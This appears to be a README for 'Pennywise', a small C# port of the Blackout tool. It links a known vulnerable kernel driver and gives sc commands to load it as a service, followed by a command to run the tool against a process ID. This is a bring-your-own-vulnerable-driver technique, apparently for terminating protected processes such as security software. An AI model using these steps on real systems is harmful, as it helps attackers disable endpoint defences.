# Pennywise

This is a c# tinny version of Blackout: https://github.com/ZeroMemoryEx/Blackout

sample of vulnerable driver: https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/

# Steps

1) Load and start the driver:

```
sc create Pennywise binPath="c:\path\to\driver.sys" type= kernel start= demand
sc start Pennywise
```

2) Start Pennywise

```
Pennywise.exe -p PID
```
